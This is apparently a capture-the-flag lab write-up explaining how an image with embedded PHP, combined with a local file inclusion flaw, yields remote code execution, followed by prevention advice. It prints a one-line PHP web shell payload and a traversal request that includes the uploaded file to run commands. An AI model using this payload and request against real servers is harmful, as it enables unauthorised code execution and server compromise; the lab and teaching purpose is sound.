# File Upload + LFI → RCE

## Lab Overview

This lab demonstrates how combining:

- File Upload vulnerability
- Local File Inclusion (LFI)

can lead to:

```text
Remote Code Execution (RCE)
```

Main learning point:

Even if direct PHP upload is blocked, attackers may still execute code by:

1. Uploading a modified image
2. Injecting PHP payload inside image data
3. Using LFI to include the uploaded file

---

# Vulnerability Chain

```text
File Upload → LFI → PHP Execution → RCE
```

Individually:

- Upload feature alone may seem harmless
- LFI alone may only read files

But together they become critical.

---

# Step 1 - Upload Image with PHP Payload

Created an image file and modified its binary data.

Used `vim` to inject PHP code inside the image.

Example payload:

```php
<?php system($_GET['cmd']); ?>
```

The file still appeared as a valid image.

---

# Why This Works

Many applications only verify:

- File extension
- MIME type
- Image header bytes

Example:

```text
.jpg
.png
GIF89a
```

They do NOT inspect the full file content.

Because of this:

- Image remains uploadable
- PHP code stays hidden inside file

This is often called a:

```text
Polyglot file
```

A file valid as both:

- Image
- PHP script

---

# Step 2 - Identify Upload Path

After upload, identified the stored file location.

Example:

```text
/uploads/shell.jpg
```

Knowing the exact path is important because LFI requires including that file.

---

# Step 3 - Exploit LFI

Used the LFI parameter to include the uploaded image.

Example:

```text
/index.php?page=../../uploads/shell.jpg&cmd=id
```
<img width="911" height="487" alt="image" src="https://github.com/user-attachments/assets/51a951e5-c493-4945-9879-651308e32032" />
<img width="1167" height="310" alt="image" src="https://github.com/user-attachments/assets/4e86db58-8cee-4ee2-ab20-ea3f861f4ddf" />
<img width="990" height="261" alt="image" src="https://github.com/user-attachments/assets/2e11d46e-5cce-44de-b6d0-fadcd10c6913" />

---

# What Happens Internally?

Normally:

```php
include($_GET['page']);
```

is intended to include application pages.

But attacker supplied:

```text
/uploads/shell.jpg
```

PHP does NOT care about extension during inclusion.

When PHP includes the file:

1. Reads entire file
2. Encounters embedded PHP tags
3. Parses PHP code
4. Executes commands

Result:

```php
system($_GET['cmd']);
```

becomes active Remote Code Execution.

---

# Why the Image Executes

Important concept:

PHP execution depends on:

```text
How file is processed
```

NOT just file extension.

Direct browser request:

```text
shell.jpg
```

may only render image.

But:

```php
include("shell.jpg");
```

forces PHP interpreter to parse the file.

If PHP tags exist:

```php
<?php ... ?>
```

they execute.

---

# Command Execution

Used:

```text
&cmd=id
```

to verify code execution.

Then executed commands to retrieve the flag.

---

# Key Learnings

- File upload filtering is often weak
- Image files can contain executable PHP code
- LFI can transform harmless uploads into RCE
- PHP executes included files regardless of extension
- Chained vulnerabilities are extremely dangerous

---

# Security Impact

Successful exploitation may lead to:

- Remote Code Execution
- Web shell upload
- Full server compromise
- Credential theft
- Persistence on server

---

# Prevention

- Never include user-controlled paths
- Store uploads outside web root
- Disable execution in upload directories
- Validate file content properly
- Strip embedded PHP tags
- Use randomized filenames
- Restrict dangerous PHP functions
